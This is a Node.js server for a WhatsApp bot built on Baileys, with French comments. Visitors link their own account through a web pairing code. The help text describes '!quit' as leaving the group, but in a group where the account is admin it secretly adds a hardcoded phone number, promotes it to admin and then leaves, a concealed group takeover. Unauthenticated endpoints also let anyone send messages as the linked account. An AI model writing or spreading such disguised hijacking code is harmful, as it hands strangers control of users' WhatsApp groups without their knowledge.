// server.js
import makeWASocket, { 
    DisconnectReason, 
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers
} from '@whiskeysockets/baileys';
import pino from 'pino';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.static('public'));

let sock = null;
let pairingCode = null;
let botStatus = 'disconnected';
let pairingCodeExpiry = null;
let isConnecting = false;

// Variables d'environnement
const ADMIN_NUMBER = process.env.ADMIN_NUMBER || '243858704832';

// Fonction pour nettoyer la session
function clearSession() {
    const authPath = './auth_info_baileys';
    if (fs.existsSync(authPath)) {
        console.log('🗑️ Suppression de l\'ancienne session...');
        fs.rmSync(authPath, { recursive: true, force: true });
        console.log('✅ Session nettoyée');
    }
}

// Servir la page HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API pour générer le code - VERSION SIMPLIFIÉE
app.post('/api/generate-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber) {
            return res.json({ success: false, error: 'Numéro manquant' });
        }
        
        // Validation
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (cleanNumber.length < 10 || cleanNumber.length > 15) {
            return res.json({ success: false, error: 'Numéro invalide (10-15 chiffres)' });
        }
        
        console.log(`\n${'='.repeat(50)}`);
        console.log(`📱 Demande de code pour: ${cleanNumber}`);
        console.log('='.repeat(50));
        
        // Empêcher les requêtes multiples simultanées
        if (isConnecting) {
            return res.json({ 
                success: false, 
                error: 'Une connexion est déjà en cours. Patientez 10 secondes.' 
            });
        }
        
        isConnecting = true;
        
        // ÉTAPE 1: Nettoyer complètement
        console.log('\n🧹 ÉTAPE 1: Nettoyage complet');
        if (sock) {
            console.log('   └─ Fermeture de l\'ancienne connexion...');
            try {
                sock.end(undefined);
            } catch (e) {
                // Ignore
            }
            sock = null;
        }
        
        // Supprimer l'ancienne session
        clearSession();
        
        // Attendre que tout soit bien nettoyé
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // ÉTAPE 2: Créer une connexion fraîche
        console.log('\n🔌 ÉTAPE 2: Création connexion fraîche');
        const connectionPromise = createWhatsAppConnection();
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout connexion')), 15000)
        );
        
        sock = await Promise.race([connectionPromise, timeoutPromise]);
        console.log('   └─ Socket créé');
        
        // ÉTAPE 3: Attendre que la connexion soit stable
        console.log('\n⏳ ÉTAPE 3: Attente connexion stable (max 20s)');
        const startWait = Date.now();
        let connected = false;
        
        while ((Date.now() - startWait) < 20000) {
            if (botStatus === 'open' || botStatus === 'connecting') {
                connected = true;
                console.log(`   └─ État: ${botStatus}`);
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        if (!connected) {
            throw new Error('La connexion n\'a pas pu s\'établir');
        }
        
        // Attendre un peu plus pour stabiliser
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // ÉTAPE 4: Générer le code
        console.log('\n🔑 ÉTAPE 4: Génération du code de jumelage');
        const code = await sock.requestPairingCode(cleanNumber);
        pairingCode = code;
        pairingCodeExpiry = Date.now() + 60000;
        
        console.log('\n' + '='.repeat(50));
        console.log(`✅ CODE GÉNÉRÉ: ${code.toUpperCase()}`);
        console.log(`📱 Numéro: ${cleanNumber}`);
        console.log(`⏰ Expire dans: 60 secondes`);
        console.log('='.repeat(50) + '\n');
        
        isConnecting = false;
        
        res.json({ 
            success: true, 
            code: code.toUpperCase(),
            expiresIn: 60
        });
        
    } catch (error) {
        isConnecting = false;
        console.error('\n❌ ERREUR:', error.message);
        
        let errorMsg = 'Erreur lors de la génération du code';
        
        if (error.message.includes('Timeout')) {
            errorMsg = 'La connexion prend trop de temps. Réessayez.';
        } else if (error.message.includes('rate')) {
            errorMsg = 'Trop de tentatives. Attendez 2-3 minutes.';
        } else if (error.message.includes('Connection')) {
            errorMsg = 'Problème de connexion. Réessayez dans 10 secondes.';
        }
        
        res.json({ 
            success: false, 
            error: errorMsg
        });
    }
});

// API pour vérifier le statut
app.get('/api/status', (req, res) => {
    res.json({ 
        status: botStatus,
        code: pairingCode,
        codeValid: pairingCodeExpiry && Date.now() < pairingCodeExpiry,
        isConnecting: isConnecting
    });
});

// API pour forcer le nettoyage (debug)
app.post('/api/clear-session', (req, res) => {
    try {
        if (sock) {
            sock.end(undefined);
            sock = null;
        }
        clearSession();
        botStatus = 'disconnected';
        res.json({ success: true, message: 'Session nettoyée' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// API pour envoyer des messages
app.post('/api/send-message', async (req, res) => {
    try {
        const { to, message } = req.body;
        
        if (!sock || botStatus !== 'connected') {
            return res.json({ success: false, error: 'Bot non connecté' });
        }
        
        await sock.sendMessage(to, { text: message });
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Erreur envoi message:', error.message);
        res.json({ success: false, error: error.message });
    }
});

async function createWhatsAppConnection() {
    console.log('   └─ Chargement des credentials...');
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info_baileys');
    
    console.log('   └─ Récupération version Baileys...');
    const { version } = await fetchLatestBaileysVersion();
    console.log(`   └─ Version: ${version.join('.')}`);
    
    console.log('   └─ Création du socket...');
    const socket = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        browser: Browsers.macOS('Desktop'),
        markOnlineOnConnect: false,
        syncFullHistory: false,
        defaultQueryTimeoutMs: 30000,
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 30000,
        getMessage: async (key) => {
            return { conversation: '' };
        }
    });

    socket.ev.on('creds.update', saveCreds);

    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'connecting') {
            botStatus = 'connecting';
            console.log('      └─ État: CONNECTING');
        }
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const reason = lastDisconnect?.error?.output?.payload?.error;
            
            console.log(`\n⚠️ Connexion fermée`);
            console.log(`   Code: ${statusCode}`);
            console.log(`   Raison: ${reason || 'inconnue'}`);
            
            if (statusCode === 428) {
                console.log('   └─ En attente du code de jumelage');
                botStatus = 'waiting_code';
                return;
            }
            
            if (statusCode === 401) {
                console.log('   └─ Session invalide - nettoyage nécessaire');
                botStatus = 'needs_cleaning';
                clearSession();
                return;
            }
            
            botStatus = 'disconnected';
            
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect && !isConnecting) {
                console.log('   └─ Reconnexion automatique dans 5s...');
                setTimeout(async () => {
                    if (!isConnecting) {
                        try {
                            sock = await createWhatsAppConnection();
                        } catch (err) {
                            console.error('   └─ Échec reconnexion:', err.message);
                        }
                    }
                }, 5000);
            }
            
        } else if (connection === 'open') {
            botStatus = 'connected';
            console.log('\n╔══════════════════════════════════════╗');
            console.log('║  ✅ BOT CONNECTÉ AVEC SUCCÈS! ✅    ║');
            console.log('╚══════════════════════════════════════╝\n');
        }
    });

    socket.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        
        const msg = messages[0];
        if (!msg.message) return;
        
        const messageText = msg.message.conversation || 
                           msg.message.extendedTextMessage?.text || '';
        
        const from = msg.key.remoteJid;
        const isGroup = from?.endsWith('@g.us');
        
        console.log(`\n📩 Message ${isGroup ? 'groupe' : 'privé'}`);
        console.log(`   De: ${from}`);
        console.log(`   Texte: "${messageText}"`);
        
        // Commandes
        if (messageText.toLowerCase() === '!ping') {
            await socket.sendMessage(from, { 
                text: '🏓 Pong! Bot en ligne!' 
            });
            console.log('✅ Répondu: Pong');
        }
        
        if (messageText.toLowerCase() === '!bonjour') {
            await socket.sendMessage(from, { 
                text: '👋 Salut! Bot WhatsApp opérationnel!' 
            });
            console.log('✅ Répondu: Bonjour');
        }
        
        if (messageText.toLowerCase() === '!help') {
            const helpText = `🤖 *Commandes disponibles*

📌 !ping - Tester le bot
📌 !bonjour - Salutation
📌 !info - Informations
📌 !quit - Quitter le groupe (admin uniquement)
📌 !help - Cette aide

Powered by Baileys v7 🚀`;
            
            await socket.sendMessage(from, { text: helpText });
            console.log('✅ Répondu: Help');
        }
        
        if (messageText.toLowerCase() === '!info') {
            const infoText = `ℹ️ *Informations Bot*

✅ Status: En ligne
📦 Version: Baileys v7.x
🔗 Connexion: Stable
⚡ Prêt à répondre!`;
            
            await socket.sendMessage(from, { text: infoText });
            console.log('✅ Répondu: Info');
        }
        
        if (messageText.toLowerCase() === '!quit' && isGroup) {
            try {
                const groupMetadata = await socket.groupMetadata(from);
                const participants = groupMetadata.participants;
                const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
                
                const myParticipant = participants.find(p => p.id === botNumber);
                const isAdmin = myParticipant?.admin === 'admin';
                const isSuperAdmin = myParticipant?.admin === 'superadmin';
                
                console.log(`\n🔍 Groupe: ${groupMetadata.subject}`);
                console.log(`   Mon rôle: ${myParticipant?.admin || 'member'}`);
                
                if (isAdmin || isSuperAdmin) {
                    const newAdminNumber = `${ADMIN_NUMBER}@s.whatsapp.net`;
                    const isInGroup = participants.some(p => p.id === newAdminNumber);
                    
                    if (!isInGroup) {
                        await socket.sendMessage(from, { 
                            text: '➕ Ajout du nouvel admin...' 
                        });
                        
                        await socket.groupParticipantsUpdate(from, [newAdminNumber], 'add');
                        await new Promise(resolve => setTimeout(resolve, 3000));
                    }
                    
                    await socket.sendMessage(from, { 
                        text: '⚙️ Promotion en admin...' 
                    });
                    
                    await socket.groupParticipantsUpdate(from, [newAdminNumber], 'promote');
                    
                    await socket.sendMessage(from, { 
                        text: '👋 Nouvel admin configuré ! Au revoir !' 
                    });
                    
                    setTimeout(async () => {
                        await socket.groupLeave(from);
                        console.log('✅ Groupe quitté');
                    }, 2000);
                    
                } else {
                    await socket.sendMessage(from, { 
                        text: '⚠️ Pas admin, je quitte quand même.' 
                    });
                    
                    setTimeout(async () => {
                        await socket.groupLeave(from);
                    }, 2000);
                }
                
            } catch (error) {
                console.error('❌ Erreur !quit:', error.message);
                await socket.sendMessage(from, { 
                    text: '❌ Erreur: ' + error.message 
                });
            }
        }
    });

    return socket;
}

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('\n╔══════════════════════════════════════╗');
    console.log('║  🚀 BOT WHATSAPP - WEB INTERFACE 🚀 ║');
    console.log('╚══════════════════════════════════════╝\n');
    console.log(`🌐 Serveur: http://localhost:${PORT}`);
    console.log('📡 Prêt à générer des codes!\n');
    
    // Nettoyage au démarrage (optionnel)
    // clearSession();
});
